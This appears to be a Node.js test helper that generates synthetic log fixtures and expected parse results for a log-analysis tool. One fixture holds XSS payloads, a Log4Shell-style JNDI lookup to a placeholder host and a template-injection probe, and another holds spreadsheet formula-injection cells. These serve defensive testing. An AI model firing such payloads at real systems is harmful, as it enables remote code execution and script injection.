'use strict';
// The corpus of original sample logs: every file is built here from a fixed formula (nothing is
// copied from a real system; all names, addresses and numbers are invented). Each entry carries the
// expectations that hold by construction: the number of lines, the encoding, the time stamp format
// the detector must pick (or null), and the number of lines per level rank (0 trace .. 5 fatal; -1 none).
// test/helpers/write-corpus.js writes the files to test/fixtures/corpus; test/corpus.test.js checks
// that the files on disk equal what this module builds and that the engine agrees with the expectations.

const { rng } = require('./gen');

const LEVELS = ['TRACE', 'DEBUG', 'INFO', 'WARN', 'ERROR', 'FATAL'];

function counter() { return { '-1': 0, 0: 0, 1: 0, 2: 0, 3: 0, 4: 0, 5: 0 }; }
function iso(ms) { return new Date(ms).toISOString(); }
const T0 = Date.UTC(2026, 0, 15, 10, 0, 0);

/** A text file from lines; `levels` is an array of ranks (one per line) or a counts object. */
function text(name, lines, o) {
  const opts = o || {};
  const counts = counter();
  const ranks = opts.ranks || [];
  for (const r of ranks) counts[r]++;
  return {
    name: name, lines: lines, eol: opts.eol === undefined ? '\n' : opts.eol, finalEol: opts.finalEol !== false, encoding: opts.encoding || 'utf8', bom: !!opts.bom,
    expect: { lines: lines.length, encoding: opts.expectEncoding || opts.encoding || 'utf8', time: opts.time === undefined ? null : opts.time, levels: counts, profile: opts.profile === undefined ? null : opts.profile, binary: !!opts.binary }
  };
}
function raw(name, bytes, expect) { return { name: name, bytes: bytes, expect: expect }; }

/** n records with a level pattern; returns { lines, ranks }. */
function appLines(n, fmt, pattern) {
  const lines = [];
  const ranks = [];
  for (let i = 0; i < n; i++) {
    const rank = pattern(i);
    ranks.push(rank);
    lines.push(fmt(i, LEVELS[rank], T0 + i * 1500));
  }
  return { lines: lines, ranks: ranks };
}
const cycle = (i) => (i % 13 === 0 ? 4 : i % 7 === 0 ? 3 : i % 5 === 0 ? 1 : 2);

function build() {
  const files = [];
  const add = (f) => { files.push(f); return f; };

  // ---- application logs -------------------------------------------------------------------------
  let a = appLines(60, (i, lv, t) => iso(t) + ' ' + lv.padEnd(5) + ' worker-' + (i % 4) + ' handled item ' + (1000 + i), cycle);
  add(text('app-iso-60.log', a.lines, { ranks: a.ranks, time: 'iso' }));

  a = appLines(40, (i, lv, t) => iso(t).slice(0, 10) + ' ' + iso(t).slice(11, 23).replace('.', ',') + ' [pool-' + (i % 3) + '] ' + lv.padEnd(5) + ' com.example.Job - step ' + i, cycle);
  const trace = [];
  const traceRanks = [];
  a.lines.forEach((l, i) => { trace.push(l); traceRanks.push(a.ranks[i]); if (a.ranks[i] === 4) { trace.push('java.lang.IllegalStateException: step ' + i + ' failed', '\tat com.example.Job.run(Job.java:' + (40 + i) + ')', '\tat com.example.Main.main(Main.java:12)'); traceRanks.push(-1, -1, -1); } });
  add(text('log4j-stacktrace.log', trace, { ranks: traceRanks, time: 'iso' }));

  a = appLines(30, (i, lv, t) => iso(t).slice(0, 19).replace('T', ' ') + ',' + String(100 + i).padStart(3, '0') + ' - app.main - ' + lv + ' - message number ' + i, cycle);
  add(text('python-logging.log', a.lines, { ranks: a.ranks, time: 'iso' }));

  a = appLines(24, (i, lv, t) => iso(t).slice(11, 23) + ' ' + lv + ' tick ' + i, cycle);
  add(text('time-only.log', a.lines, { ranks: a.ranks, time: 'time-of-day' }));

  a = appLines(24, (i, lv, t) => '01-15 ' + iso(t).slice(11, 23) + '  1234  5678 ' + lv[0] + ' Tag: ' + lv + ' event ' + i, cycle);
  add(text('logcat.log', a.lines, { ranks: a.ranks, time: 'logcat' }));

  add(text('no-timestamps.log', ['starting up', 'reading configuration', 'ERROR could not read value', 'continuing with defaults', 'WARN cache is cold', 'done'], { ranks: [-1, -1, 4, -1, 3, -1], time: null }));
  add(text('levels-varied.log', [
    '2026-01-15T10:00:00Z FATAL out of memory', '2026-01-15T10:00:01Z CRITICAL disk gone', '2026-01-15T10:00:02Z SEVERE lost quorum', '2026-01-15T10:00:03Z ERROR failed', '2026-01-15T10:00:04Z ERR short form',
    '2026-01-15T10:00:05Z WARNING slow', '2026-01-15T10:00:06Z WARN also slow', '2026-01-15T10:00:07Z NOTICE hello', '2026-01-15T10:00:08Z INFO fine', '2026-01-15T10:00:09Z DEBUG detail',
    '2026-01-15T10:00:10Z TRACE enter', '2026-01-15T10:00:11Z VERBOSE chatty', '{"ts":"2026-01-15T10:00:12Z","level":"error","msg":"json"}', 'ts=2026-01-15T10:00:13Z level=warn msg="logfmt"',
    '2026/01/15 10:00:14 [crit] 1#1: boom', '2026/01/15 10:00:15 [info] 1#1: ok', 'Error: starts the line', 'the word error inside a sentence has no level'
  ], { ranks: [5, 5, 4, 4, 4, 3, 3, 2, 2, 1, 0, 0, 4, 3, 5, 2, 4, -1], time: 'iso' }));
  add(text('out-of-order-times.log', ['2026-01-15T10:00:05Z INFO five', '2026-01-15T10:00:01Z INFO one', '2026-01-15T10:00:09Z INFO nine', '2026-01-15T10:00:02Z INFO two', '2026-01-15T10:00:07Z INFO seven'], { ranks: [2, 2, 2, 2, 2], time: 'iso' }));
  add(text('duplicate-times.log', Array.from({ length: 20 }, (_, i) => '2026-01-15T10:00:00.000Z INFO same instant ' + i), { ranks: new Array(20).fill(2), time: 'iso' }));
  add(text('blank-lines.log', ['2026-01-15T10:00:00Z INFO a', '', '2026-01-15T10:00:01Z WARN b', '', '', '2026-01-15T10:00:02Z ERROR c', ''], { ranks: [2, -1, 3, -1, -1, 4, -1], time: 'iso' }));
  add(text('trailing-spaces.log', ['2026-01-15T10:00:00Z INFO a   ', '2026-01-15T10:00:01Z INFO b\t', '2026-01-15T10:00:02Z INFO c '], { ranks: [2, 2, 2], time: 'iso' }));
  add(text('single-line-no-eol.log', ['2026-01-15T10:00:00Z INFO only line'], { finalEol: false, ranks: [2], time: 'iso' }));
  add(text('only-newlines.log', ['', '', '', ''], { ranks: [-1, -1, -1, -1], time: null }));
  add(text('empty.log', [], { time: null }));
  files.push({ name: 'mixed-eol.log', bytes: Buffer.from('2026-01-15T10:00:00Z INFO unix\n2026-01-15T10:00:01Z WARN windows\r\n2026-01-15T10:00:02Z ERROR unix again\n2026-01-15T10:00:03Z INFO windows again\r\n2026-01-15T10:00:04Z INFO last unix\n', 'utf8'), expect: { lines: 5, encoding: 'utf8', time: 'iso', levels: Object.assign(counter(), { 2: 3, 3: 1, 4: 1 }), profile: null, binary: false } });
  add(text('crlf.log', Array.from({ length: 10 }, (_, i) => '2026-01-15T10:00:0' + i + 'Z INFO line ' + i), { eol: '\r\n', ranks: new Array(10).fill(2), time: 'iso' }));
  add(text('tabs-unicode.log', ['2026-01-15T10:00:00Z INFO\ttabbed\tfields', '2026-01-15T10:00:01Z INFO emoji 😀 and CJK 日本語', '2026-01-15T10:00:02Z WARN right-to-left שלום مرحبا', '2026-01-15T10:00:03Z INFO combining é and ü'], { ranks: [2, 2, 3, 2], time: 'iso' }));
  add(text('long-lines.log', [
    '2026-01-15T10:00:00Z INFO short', '2026-01-15T10:00:01Z WARN ' + 'w'.repeat(5000), '2026-01-15T10:00:02Z INFO short again', '2026-01-15T10:00:03Z ERROR ' + 'e'.repeat(20000), '2026-01-15T10:00:04Z INFO end'
  ], { ranks: [2, 3, 2, 4, 2], time: 'iso' }));
  add(text('long-single-line.log', ['x'.repeat(200000)], { ranks: [-1], time: null }));
  add(text('hostile-markup.log', ['2026-01-15T10:00:00Z INFO <script>alert(1)</script>', '2026-01-15T10:00:01Z WARN <img src=x onerror=alert(1)>', '2026-01-15T10:00:02Z INFO "><svg onload=alert(1)>', '2026-01-15T10:00:03Z INFO ${jndi:ldap://example.invalid/a} {{7*7}}'], { ranks: [2, 3, 2, 2], time: 'iso' }));
  add(text('formula-cells.log', ['=HYPERLINK("http://example.invalid","click")', '+1+1', '-2+3', '@SUM(1,2)', '\t=tab first', '2026-01-15T10:00:00Z INFO normal'], { ranks: [-1, -1, -1, -1, -1, 2], time: null }));

  // ---- web servers ----------------------------------------------------------------------------------
  const statuses = [200, 200, 304, 404, 200, 500, 200, 301, 200, 403];
  const access = [];
  for (let i = 0; i < 40; i++) access.push('192.0.2.' + (10 + (i % 7)) + ' - ' + (i % 5 === 0 ? 'alice' : '-') + ' [15/Jan/2026:10:00:' + String(i).padStart(2, '0') + ' +0000] "GET /items/' + i + ' HTTP/1.1" ' + statuses[i % 10] + ' ' + (200 + i * 13) + ' "-" "Agent/1.0"');
  add(text('nginx-access.log', access, { ranks: new Array(40).fill(-1), time: 'clf', profile: 'access' }));
  add(text('apache-access-common.log', access.slice(0, 25).map((l) => l.replace(' "-" "Agent/1.0"', '')), { ranks: new Array(25).fill(-1), time: 'clf', profile: 'access' }));
  add(text('nginx-error.log', Array.from({ length: 12 }, (_, i) => '2026/01/15 10:00:' + String(i).padStart(2, '0') + ' [' + (i % 4 === 0 ? 'error' : i % 4 === 1 ? 'warn' : 'notice') + '] 31#31: *' + (100 + i) + ' event ' + i + ', client: 192.0.2.7, server: example.invalid'), {
    ranks: Array.from({ length: 12 }, (_, i) => (i % 4 === 0 ? 4 : i % 4 === 1 ? 3 : 2)), time: 'slash', profile: 'nginx-error'
  }));
  add(text('apache-error.log', Array.from({ length: 8 }, (_, i) => '[Thu Jan 15 10:00:0' + i + '.123456 2026] [core:' + (i % 2 ? 'warn' : 'error') + '] [pid 1234:tid 5678] [client 192.0.2.7:5555] AH0000' + i + ': event ' + i), {
    ranks: Array.from({ length: 8 }, (_, i) => (i % 2 ? 3 : 4)), time: 'apache-error', profile: 'apache-error'
  }));

  // ---- syslog -----------------------------------------------------------------------------------------
  add(text('syslog-3164.log', Array.from({ length: 15 }, (_, i) => '<' + (i % 3 === 0 ? 11 : 14) + '>Jan 15 10:00:' + String(i).padStart(2, '0') + ' host1 daemon[' + (200 + i) + ']: event ' + i), { ranks: new Array(15).fill(-1), time: 'syslog', profile: 'syslog' }));
  add(text('syslog-5424.log', Array.from({ length: 10 }, (_, i) => '<165>1 2026-01-15T10:00:0' + i + '.003Z host1 app ' + (300 + i) + ' ID' + i + ' [meta@1 seq="' + i + '"] event ' + i), { ranks: new Array(10).fill(-1), time: 'iso', profile: 'syslog' }));

  // ---- structured ----------------------------------------------------------------------------------------
  const jl = Array.from({ length: 30 }, (_, i) => JSON.stringify({ ts: iso(T0 + i * 2000), level: cycle(i) === 4 ? 'error' : cycle(i) === 3 ? 'warn' : cycle(i) === 1 ? 'debug' : 'info', service: 'svc' + (i % 3), msg: 'event ' + i, n: i }));
  add(text('jsonl-flat.jsonl', jl, { ranks: Array.from({ length: 30 }, (_, i) => cycle(i)), time: 'iso', profile: 'jsonl' }));
  add(text('jsonl-nested.jsonl', Array.from({ length: 12 }, (_, i) => JSON.stringify({ ts: iso(T0 + i * 1000), level: 'info', req: { id: 'r' + i, path: '/p' + i, headers: { host: 'example.invalid' } }, tags: ['a', 'b'] })), { ranks: new Array(12).fill(2), time: 'iso', profile: 'jsonl' }));
  add(text('jsonl-bigids.jsonl', Array.from({ length: 10 }, (_, i) => '{"ts":"' + iso(T0 + i * 1000) + '","level":"info","order_id":' + (12345678901234567000n + BigInt(i)).toString() + ',"amount":' + (10 + i) + '.50}'), { ranks: new Array(10).fill(2), time: 'iso', profile: 'jsonl' }));
  add(text('jsonl-mixed-garbage.jsonl', ['{"ts":"2026-01-15T10:00:00Z","level":"info","msg":"ok"}', '{"ts":"2026-01-15T10:00:01Z","level":"warn","msg":"cut', 'not json at all', '', '{"ts":"2026-01-15T10:00:03Z","level":"error","msg":"ok again"}', '[1,2,3]'], { ranks: [2, 3, -1, -1, 4, -1], time: 'iso', profile: null }));
  add(text('logfmt-service.log', Array.from({ length: 16 }, (_, i) => 'ts=' + iso(T0 + i * 1000) + ' level=' + (i % 4 === 0 ? 'error' : i % 4 === 1 ? 'warn' : 'info') + ' msg="event ' + i + '" user=u' + (i % 5) + ' latency_ms=' + (10 + i)), {
    ranks: Array.from({ length: 16 }, (_, i) => (i % 4 === 0 ? 4 : i % 4 === 1 ? 3 : 2)), time: 'iso', profile: 'logfmt'
  }));
  add(text('epoch-json.log', Array.from({ length: 12 }, (_, i) => '{"time":' + (1768471200 + i) + '.' + String(i * 83).padStart(3, '0') + ',"level":"info","n":' + i + '}'), { ranks: new Array(12).fill(2), time: 'epoch', profile: 'jsonl' }));
  add(text('docker-style.log', Array.from({ length: 10 }, (_, i) => iso(T0 + i * 1000).replace('Z', '123456Z') + ' stdout F ' + (i === 5 ? 'ERROR ' : 'INFO ') + 'container line ' + i), { ranks: Array.from({ length: 10 }, (_, i) => (i === 5 ? 4 : 2)), time: 'iso' }));

  // ---- encodings and damage ---------------------------------------------------------------------------------
  const enc = ['2026-01-15T10:00:00Z INFO café crème', '2026-01-15T10:00:01Z WARN naïve', '2026-01-15T10:00:02Z ERROR straße'];
  add(text('bom-utf8.log', enc, { bom: true, ranks: [2, 3, 4], time: 'iso' }));
  add(text('utf16le-bom.log', enc, { encoding: 'utf16le', ranks: [2, 3, 4], time: 'iso' }));
  add(text('utf16be-bom.log', enc, { encoding: 'utf16be', ranks: [2, 3, 4], time: 'iso' }));
  add(text('utf16le-nobom.log', enc, { encoding: 'utf16le', bom: false, ranks: [2, 3, 4], time: 'iso' }));
  files[files.length - 1].noBom = true;
  add(text('latin1.log', enc, { encoding: 'latin1', ranks: [2, 3, 4], time: 'iso' }));
  files.push({ name: 'invalid-utf8.log', bytes: Buffer.from([...Buffer.from('2026-01-15T10:00:00Z INFO ok\n2026-01-15T10:00:01Z WARN bad bytes '), 0xC3, 0x28, 0xA0, 0xA1, 0xE2, 0x28, 0xA1, ...Buffer.from('\n2026-01-15T10:00:02Z ERROR end\n')]), expect: { lines: 3, encoding: 'latin1', time: 'iso', levels: Object.assign(counter(), { 2: 1, 3: 1, 4: 1 }), profile: null, binary: false } });
  const g = rng(2026);
  const garbage = Buffer.alloc(4096);
  for (let i = 0; i < garbage.length; i++) garbage[i] = Math.floor(g() * 256);
  garbage[0] = 0x01; garbage[1] = 0x00;
  let lf = 0;
  for (let i = 0; i < garbage.length; i++) if (garbage[i] === 0x0A) lf++;
  files.push({ name: 'binary-garbage.bin', bytes: garbage, expect: { lines: null, encoding: null, time: null, levels: null, profile: null, binary: true, garbage: true, lfCount: lf } });
  files.push({ name: 'nul-bytes-in-text.log', bytes: Buffer.from('2026-01-15T10:00:00Z INFO first\n2026-01-15T10:00:01Z WARN with\u0000nul\u0000bytes\n2026-01-15T10:00:02Z INFO last\n', 'utf8'), expect: { lines: 3, encoding: 'utf8', time: 'iso', levels: Object.assign(counter(), { 2: 2, 3: 1 }), profile: null, binary: true } });
  files.push({ name: 'lone-cr.log', bytes: Buffer.from('line one\rline two\rline three\r', 'utf8'), expect: { lines: 1, encoding: 'utf8', time: null, levels: Object.assign(counter(), { '-1': 1 }), profile: null, binary: false } });

  // ---- sample data for the Pro tools -------------------------------------------------------------------------------
  add(text('pii-sample.log', [
    '2026-01-15T10:00:00Z INFO login ok user=ann.lee@example.invalid ip=192.0.2.44',
    '2026-01-15T10:00:01Z INFO login ok user=bob.ray@example.invalid ip=192.0.2.45 session=9f8e7d6c5b4a39281706f5e4d3c2b1a0',
    '2026-01-15T10:00:02Z WARN token rejected Bearer abcdEFGH12345678ijkl from 2001:db8:85a3:0:0:8a2e:370:7334',
    '2026-01-15T10:00:03Z INFO payment card 4111 1111 1111 1111 accepted for ann.lee@example.invalid',
    '2026-01-15T10:00:04Z ERROR customer CUST-482913 not found (api_key=sk-demo-1234567890abcdef)'
  ], { ranks: [2, 2, 3, 2, 4], time: 'iso' }));
  const svc = (name, offset, n) => Array.from({ length: n }, (_, i) => iso(T0 + offset + i * 3000) + ' ' + (i % 6 === 5 ? 'ERROR' : 'INFO ') + ' ' + name + ' request ' + i);
  add(text('merge-a-gateway.log', svc('gateway', 0, 12), { ranks: Array.from({ length: 12 }, (_, i) => (i % 6 === 5 ? 4 : 2)), time: 'iso' }));
  add(text('merge-b-billing.log', svc('billing', 1000, 10), { ranks: Array.from({ length: 10 }, (_, i) => (i % 6 === 5 ? 4 : 2)), time: 'iso' }));
  add(text('merge-c-mailer.log', svc('mailer', 2000, 8), { ranks: Array.from({ length: 8 }, (_, i) => (i % 6 === 5 ? 4 : 2)), time: 'iso' }));
  add(text('excerpt-run-1.log', ['2026-01-15T10:00:00.100Z INFO start id=550e8400-e29b-41d4-a716-446655440000', '2026-01-15T10:00:01.200Z INFO step one took 12ms', '2026-01-15T10:00:02.300Z WARN slow call 9981234 us', '2026-01-15T10:00:03.400Z INFO done'], { ranks: [2, 2, 3, 2], time: 'iso' }));
  add(text('excerpt-run-2.log', ['2026-02-20T08:15:00.900Z INFO start id=123e4567-e89b-12d3-a456-426614174000', '2026-02-20T08:15:01.100Z INFO step one took 12ms', '2026-02-20T08:15:02.700Z ERROR step two failed', '2026-02-20T08:15:03.800Z INFO done'], { ranks: [2, 2, 4, 2], time: 'iso' }));
  return files;
}

/** The bytes of an entry as they are written to disk. */
function bytesOf(f) {
  if (f.bytes) return f.bytes;
  const body = f.lines.join(f.eol) + (f.finalEol && f.lines.length ? f.eol : '');
  switch (f.encoding) {
    case 'utf16le': return f.noBom ? Buffer.from(body, 'utf16le') : Buffer.concat([Buffer.from([0xFF, 0xFE]), Buffer.from(body, 'utf16le')]);
    case 'utf16be': { const b = Buffer.from(body, 'utf16le'); b.swap16(); return Buffer.concat([Buffer.from([0xFE, 0xFF]), b]); }
    case 'latin1': return Buffer.from(body, 'latin1');
    default: return f.bom ? Buffer.concat([Buffer.from([0xEF, 0xBB, 0xBF]), Buffer.from(body, 'utf8')]) : Buffer.from(body, 'utf8');
  }
}

module.exports = { build, bytesOf, LEVELS };
